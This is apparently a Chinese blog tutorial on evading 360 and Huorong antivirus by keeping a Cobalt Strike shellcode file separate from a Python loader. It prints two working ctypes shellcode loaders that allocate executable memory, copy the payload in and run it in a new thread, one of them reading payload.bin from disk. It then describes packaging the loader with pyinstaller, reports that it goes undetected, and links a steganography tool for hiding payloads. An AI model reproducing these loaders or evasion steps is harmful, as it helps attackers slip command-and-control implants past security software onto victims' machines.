**python bypass杀软第二季**

## python 分离免杀bypass360、火绒=-=

环境：python3.8.0_x86、CS4.0、火绒、360全家桶、pyintaller

* * *

1、掏出python的shellcode加载器：

    
    
    import ctypes
    data = b''
    bdata = bytearray(data)
    
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_int
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(bdata)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
    buf = (ctypes.c_char * len(bdata)).from_buffer(bdata)
    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_int(ptr),
        buf,
        ctypes.c_int(len(bdata))
    )
    handle = ctypes.windll.kernel32.CreateThread(
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.c_int(ptr),
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.pointer(ctypes.c_int(0))
    )
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))
    

2、这一次介绍的是分离免杀的思路和方法，分离免杀可以很好的绕过杀软的静态查杀，相对于行为查杀却无能为力。第一步使用cs生成一个bin文件。

![image](https://image.3001.net/images/20210205/1612512663_601cfd9763d1aeb20a1d5.png!small)

3、 修改一下加载器的代码，让加载器读取bin文件然后在运行。

    
    
    import ctypes
    
    f = open('payload.bin', 'rb')
    data = f.read()
    f.close()
    bdata = bytearray(data)
    
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_int
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(bdata)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
    buf = (ctypes.c_char * len(bdata)).from_buffer(bdata)
    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_int(ptr),
        buf,
        ctypes.c_int(len(bdata))
    )
    handle = ctypes.windll.kernel32.CreateThread(
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.c_int(ptr),
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.pointer(ctypes.c_int(0))
    )
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(handle), ctypes.c_int(-1))
    

4、 使用pyinstaller进行打包，打开360进行查杀，发现360静态和动态都没拦截

![image](https://image.3001.net/images/20210205/1612512752_601cfdf098dbe68267b14.png!small)

5、由于火绒对于`ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf,
ctypes.c_int(len(bdata)))`进行拦截，只需要修改一下就行，上一篇有教怎么绕过，可以参考上一章节，

6、对于国内的杀软大多数都是静态查杀居多，=-=所以很好绕，当然如果想让分离免杀更好玩一点，可以参考ctf的隐写术。  
隐写术项目链接：https://github.com/Mr-Un1k0d3r/DKMC

